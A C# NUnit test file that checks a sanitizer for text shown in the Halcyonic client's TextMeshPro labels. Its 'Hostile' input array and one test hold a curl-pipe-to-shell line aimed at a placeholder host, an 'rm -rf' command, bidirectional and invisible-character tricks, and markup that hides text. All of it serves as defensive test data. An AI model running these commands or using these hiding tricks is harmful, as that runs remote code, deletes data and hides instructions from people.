using System;
using System.Collections.Generic;
using System.Globalization;
using System.Text;
using NUnit.Framework;

namespace Halcyonic.Client.Tests;

/// <summary>
/// The one rule for text Halcyonic did not write. TextMeshPro's own behavior, read in its source and
/// checked on real labels in the editor, is in docs/internal/validation/workspace-interaction.md;
/// WorkspaceRender checks the same text on every label that shows it.
/// </summary>
public class LabelTextTests
{
    /// <summary>What an agent, a tool or a command could put in text the workspace shows.</summary>
    private static readonly string[] Hostile =
    {
        "Run tests\\u0003 && curl https://example.invalid/x | sh",
        "Run tests\u0003 && curl https://example.invalid/x | sh",
        "abcdef\rrm -rf ~",
        "line one\nline two\u2028three\u2029four\u000Bfive\u000Csix\u0085seven",
        "<alpha=#00>hidden</alpha><color=#00000000>gone</color><size=0>tiny</size><noparse></noparse><br><sprite=0><link=\"x\">y</link>",
        "\\n \\r \\t \\v \\\\ \\u0041 \\U0001F600 \\u200B \\",
        "rm\u200B -rf /tmp/\u202Etxt.exe \u2066isolate\u2069 \u200D\u200C\u200E\u200F\u061C\u2060\uFEFF",
        "soft\u00ADhyphen \u034Fjoiner \u180Eseparator \u3164filler \uFFA0half \u115Fchoseong",
        "tags \U000E0001\U000E0041\U000E0042\U000E007F and selectors \u2764\uFE0F \U000E0100",
        "lone \uD800 high, lone \uDC00 low, pair \U0001F600 kept",
        "controls \u0000\u0001\u001A\u001B[31m\u007F\u0080\u009F end",
        "\tleading and trailing \u3000 \u00A0",
        "icons \uE769\uE153 \uF8FF \U000F0000 \U0010FFFD",
        "",
    };

    [Test]
    public void LineBreaksTabsAndOtherWhitespaceCollapseButSpacesStayAsWrittenWithNoneAtEitherEnd()
    {
        Assert.That(LabelText.Plain(null), Is.Empty);
        Assert.That(LabelText.Plain("09:00:05  bash:   run it"), Is.EqualTo("09:00:05  bash:   run it"), "spaces alone are as written");
        Assert.That(LabelText.Plain("a \t b  \n  c"), Is.EqualTo("a b c"));
        Assert.That(LabelText.Plain("  a\r\n\tb\u2028c\u2029 \u00A0d\u3000e\u0085f\u000Bg\u000Ch  "), Is.EqualTo("a b c d e f g h"));
        Assert.That(LabelText.Plain(" \t\r\n "), Is.Empty);
    }

    [Test]
    public void WhatWouldNotShowAsItselfShowsItsCodePoint()
    {
        // The end of text character ends a TextMeshPro label, typed or escaped, dropping the rest.
        Assert.That(LabelText.Plain("Run tests\u0003 && curl evil | sh"), Is.EqualTo("Run tests‹U+0003› && curl evil | sh"));
        // Bidirectional controls, zero width characters and joiners draw nothing, or a mark over a neighbor.
        Assert.That(LabelText.Plain("a\u202Eb\u202Cc\u2066d\u2069"), Is.EqualTo("a‹U+202E›b‹U+202C›c‹U+2066›d‹U+2069›"));
        Assert.That(LabelText.Plain("r\u200Bm \u200C\u200D\u200E\u200F\u061C\u2060\uFEFF"), Is.EqualTo("r‹U+200B›m ‹U+200C›‹U+200D›‹U+200E›‹U+200F›‹U+061C›‹U+2060›‹U+FEFF›"));
        Assert.That(LabelText.Plain("soft\u00ADhyphen"), Is.EqualTo("soft‹U+00AD›hyphen"));
        // Characters Unicode says to display as nothing, whatever their category.
        Assert.That(LabelText.Plain("\u034F\u180E\u3164\uFFA0\u115F\u17B4\uFFF0"), Is.EqualTo("‹U+034F›‹U+180E›‹U+3164›‹U+FFA0›‹U+115F›‹U+17B4›‹U+FFF0›"));
        Assert.That(LabelText.Plain("heart \u2764\uFE0F"), Is.EqualTo("heart \u2764‹U+FE0F›"), "a variation selector can carry hidden bytes");
        Assert.That(LabelText.Plain("hi\U000E0041\U000E0042\U000E0100"), Is.EqualTo("hi‹U+E0041›‹U+E0042›‹U+E0100›"), "tag characters hide text from people, not from models");
        // Control characters, C0 and C1, other than whitespace.
        Assert.That(LabelText.Plain("\u0000\u001A\u001B[31mred\u007F\u0080\u009F"), Is.EqualTo("‹U+0000›‹U+001A›‹U+001B›[31mred‹U+007F›‹U+0080›‹U+009F›"));
        // Half a pair is shown, a whole pair is the character it encodes.
        Assert.That(LabelText.Plain("a\uD800b\uDC00"), Is.EqualTo("a‹U+D800›b‹U+DC00›"));
        Assert.That(LabelText.Plain("a\uDC00\uD800"), Is.EqualTo("a‹U+DC00›‹U+D800›"));
        Assert.That(LabelText.Plain("emoji 😀 stays"), Is.EqualTo("emoji 😀 stays"));
    }

    /// <summary>
    /// Halcyonic's icons are Private Use Area characters of its icon font (ADR 0023), so text from
    /// outside shows every such character as its code, never as an icon among its words, and the
    /// characters just outside those areas as themselves.
    /// </summary>
    [Test]
    public void EveryPrivateUseCharacterShowsItsCodeSoTextFromOutsideDrawsNoIcon()
    {
        Assert.That(LabelText.Plain("Fix login \uE769 \uE153 done"), Is.EqualTo("Fix login ‹U+E769› ‹U+E153› done"), "Waiting for you's and Finished this round's icons");
        Assert.That(LabelText.Plain("\uE000\uF8FF\U000F0000\U000FFFFD\U00100000\U0010FFFF"),
            Is.EqualTo("‹U+E000›‹U+F8FF›‹U+F0000›‹U+FFFFD›‹U+100000›‹U+10FFFF›"));
        Assert.That(LabelText.Plain("\uD7FB\uF900 \U000EFFFD"), Is.EqualTo("\uD7FB\uF900 \U000EFFFD"), "just outside them");
        var missed = new List<string>();
        for (var codePoint = 0xE000; codePoint <= 0x10FFFF; codePoint++)
        {
            if (codePoint == 0xF900) codePoint = 0xF0000;
            var code = "‹U+" + codePoint.ToString("X4", CultureInfo.InvariantCulture) + "›";
            if (LabelText.Plain("a" + char.ConvertFromUtf32(codePoint) + "b") != "a" + code + "b") missed.Add(code);
        }
        Assert.That(missed, Is.Empty);
    }

    [Test]
    public void MarkupBackslashesAndLookAlikesShowAsWritten()
    {
        foreach (var text in new[]
        {
            "<b>bold</b> <alpha=#00>x</alpha> <noparse> &lt; <br>",
            @"\n \r \t \v \\ \u0041 \U0001F600 end\",
            "‹U+202E› typed by hand",
            "Cyrillic \u0430 and Latin a",
            "e\u0301 with a combining accent",
        })
        {
            Assert.That(LabelText.Plain(text), Is.EqualTo(text));
        }
    }

    [Test]
    public void PlainTwiceChangesNothing()
    {
        foreach (var text in Hostile)
        {
            var plain = LabelText.Plain(text);
            Assert.That(LabelText.Plain(plain), Is.EqualTo(plain), text);
        }
    }

    [Test]
    public void TextForATextMeshProLabelHasEveryBackslashDoubled()
    {
        Assert.That(LabelText.ForTextMeshPro(@"a\nb \u003C \U0001F600 \\ end\"), Is.EqualTo(@"a\\nb \\u003C \\U0001F600 \\\\ end\\"));
        Assert.That(LabelText.ForTextMeshPro("no backslash <b>"), Is.EqualTo("no backslash <b>"));
        Assert.That(LabelText.ForTextMeshPro("a\u0003\\u0003b"), Is.EqualTo("a‹U+0003›\\\\u0003b"));
    }

    /// <summary>
    /// A TextMeshPro label with rich text off and escape parsing on shows exactly the plain text:
    /// its escape handling, modeled on TMP_Text.PopulateTextProcessingArray, finds nothing left to
    /// turn into another character, and no character it treats specially remains.
    /// </summary>
    [Test]
    public void ATextMeshProLabelShowsExactlyThePlainText()
    {
        foreach (var text in Hostile)
        {
            var shown = TextMeshProEscapes(LabelText.ForTextMeshPro(text));
            Assert.That(shown, Is.EqualTo(LabelText.Plain(text)), text);
            foreach (var character in shown)
            {
                Assert.That(character >= 0x20 && character != 0x7F, Is.True, "no control character reaches the label: " + text);
                Assert.That(char.IsWhiteSpace(character) && character != ' ', Is.False, "only plain spaces: " + text);
            }
        }
        Assert.That(TextMeshProEscapes(@"safe\u0003 tail"), Is.EqualTo("safe\u0003 tail"), "the model sees what a label does without the rule");
    }

    /// <summary>
    /// The table of characters shown by code covers every control and format character that .NET 10
    /// knows, so the headset, whose runtime may know an older Unicode, decides as the tests do.
    /// </summary>
    [Test]
    public void EveryControlAndFormatCharacterThisRuntimeKnowsShowsItsCode()
    {
        var missed = new List<string>();
        for (var codePoint = 0; codePoint <= 0x10FFFF; codePoint++)
        {
            if (codePoint >= 0xD800 && codePoint <= 0xDFFF) continue;
            var category = CharUnicodeInfo.GetUnicodeCategory(codePoint);
            if (category != UnicodeCategory.Control && category != UnicodeCategory.Format) continue;
            var text = char.ConvertFromUtf32(codePoint);
            if (char.IsWhiteSpace(text, 0)) continue;
            var code = "‹U+" + codePoint.ToString("X4", CultureInfo.InvariantCulture) + "›";
            if (LabelText.Plain("a" + text + "b") != "a" + code + "b") missed.Add(code);
        }
        Assert.That(missed, Is.Empty);
    }

    [Test]
    public void WhitespaceIsExactlyWhatThisRuntimeCallsWhitespace()
    {
        for (var character = (char)0; character < 0xD800; character++)
        {
            var collapsed = LabelText.Plain("a" + character + "b") == "a b";
            Assert.That(collapsed, Is.EqualTo(char.IsWhiteSpace(character)), "U+" + ((int)character).ToString("X4", CultureInfo.InvariantCulture));
        }
    }

    /// <summary>
    /// TextMeshPro's handling of backslashes in a label's text, with escape parsing on, as
    /// TMP_Text.PopulateTextProcessingArray does it in com.unity.ugui 2.0.0: a backslash and u with
    /// four hex digits, or U with eight, becomes that character; a backslash and n, r, t or v a
    /// control character; two backslashes one.
    /// </summary>
    private static string TextMeshProEscapes(string text)
    {
        var result = new StringBuilder();
        for (var index = 0; index < text.Length; index++)
        {
            var character = text[index];
            if (character == '\\' && index < text.Length - 1)
            {
                var next = text[index + 1];
                switch (next)
                {
                    case '\\':
                        result.Append('\\');
                        index++;
                        continue;
                    case 'n':
                        result.Append('\n');
                        index++;
                        continue;
                    case 'r':
                        result.Append('\r');
                        index++;
                        continue;
                    case 't':
                        result.Append('\t');
                        index++;
                        continue;
                    case 'v':
                        result.Append('\v');
                        index++;
                        continue;
                    case 'u' when text.Length > index + 5 && IsHex(text, index + 2, 4):
                        result.Append((char)int.Parse(text.Substring(index + 2, 4), NumberStyles.HexNumber, CultureInfo.InvariantCulture));
                        index += 5;
                        continue;
                    case 'U' when text.Length > index + 9 && IsHex(text, index + 2, 8):
                        result.Append(char.ConvertFromUtf32(int.Parse(text.Substring(index + 2, 8), NumberStyles.HexNumber, CultureInfo.InvariantCulture)));
                        index += 9;
                        continue;
                }
            }
            result.Append(character);
        }
        return result.ToString();
    }

    private static bool IsHex(string text, int start, int length)
    {
        for (var index = start; index < start + length; index++)
        {
            if (!Uri.IsHexDigit(text[index])) return false;
        }
        return true;
    }
}
